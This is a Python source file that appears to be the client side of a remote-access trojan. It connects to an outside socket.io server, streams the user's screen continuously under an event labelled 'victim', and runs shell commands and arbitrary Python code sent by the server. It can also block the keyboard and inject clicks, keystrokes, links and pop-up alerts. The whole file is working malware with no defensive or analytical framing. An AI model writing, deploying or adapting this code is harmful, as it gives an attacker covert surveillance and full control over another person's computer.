from pyautogui import size, hotkey, press, write, click,alert
from time import sleep
from os import  remove
from socketio import Client
from io import BytesIO
from base64 import b64encode
from gtts import gTTS
from playsound import playsound
from keyboard import block_key, unhook_all
from webbrowser import open
from threading import Thread
from mss import mss
from PIL import Image	
from subprocess import CalledProcessError, Popen, PIPE, STDOUT, check_output


sio = Client()

sio.connect("https://pika-virus.herokuapp.com/")
# sio.connect("http://localhost:3000")
print("connected to socket")

res = size()
quality = 13
sio.emit("update_res", {"width": res[0], "height": res[1]})
sio.emit("quality", quality)

def capture_screenshot():
    # Capture entire screen
    with mss() as sct:
        monitor = sct.monitors[-1]
        
        sct_img = sct.grab(monitor)
        # Convert to PIL/Pillow Image
        return Image.frombytes('RGB', sct_img.size, sct_img.bgra, 'raw', 'BGRX')
def send_screen():
	while 1:
		img = capture_screenshot()
		buffer = BytesIO()
		
		img.save(buffer, format="jpeg", quality=quality)
		
		# try:
		sio.emit("victim",b64encode(buffer.getvalue()).decode())
		# except BadNamespaceError:
		# 	sio.disconnect()
		# 	sio.connect("https://sell-io.com/")
		# 	print("RECONNECTED")
		# 	sio.emit("victim",base64.b64encode(buffer.getvalue()).decode())
		# 	continue

def tts(text):
	tts_file = gTTS(text=text, lang="en")
	tts_file.save("voice.mp3")
	playsound("voice.mp3")
	remove('voice.mp3')


@sio.on("tts", namespace="/")
def sio_tts(text):
	tts(text)

@sio.on("cmd", namespace="/")
def sio_cmd(cmd):
	
	if cmd[:5] == "type:":
		write(cmd[5:])
		return
	try:
		with Popen(cmd, stdout=PIPE,stderr=PIPE, stdin=PIPE, bufsize=1, universal_newlines=True) as p:
			@sio.on("cmd_quit", namespace="/")
			def sio_quit():
				p.kill()
				sio.emit("output_end")

			for line in p.stdout:
				sio.emit("cmd_output", line)
			sio.emit("output_end")
	except:
		
		try:
			output = check_output(cmd, shell=True, stderr=STDOUT,stdin=PIPE).decode()
			sio.emit("cmd_output", output.rstrip())
			sio.emit("output_end")
		except CalledProcessError as e: 
			sio.emit("cmd_output", e.stdout.decode())
			sio.emit("output_end")
	

@sio.on("py", namespace="/")
def sio_py(py):
	print("executing python code")
	exec(py)
	
@sio.on("freeze_kb", namespace="/")
def sio_freeze_kb(t):
	t = int(t)
	if t > 60:
		t = 60
	print("freezing kb for %s seconds" % t)
	for i in range(150):
		block_key(i)
	sleep(t)
	unhook_all()

@sio.on("link", namespace="/")
def sio_link(link):
	open(link)

@sio.on("alert", namespace="/")
def sio_alert(data):
	alert(text=data["msg"], title=data["title"])

@sio.on("click", namespace="/")
def sio_click(data):
	print(*data)
	click(*data)


@sio.on("keypress", namespace="/")
def sio_keypress(key):
	press(key)

@sio.on("hotkey", namespace="/")
def sio_hotkey(keys):
	hotkey(*keys)

@sio.on("quality", namespace="/")
def sio_quality(q):
	global quality
	quality = int(q)

print("starting send screen now")
t = Thread(target=send_screen)
t.start()




# with open("test.png", "rb") as f:
# 	sio.emit("victim",base64.b64encode(f.read()).decode())






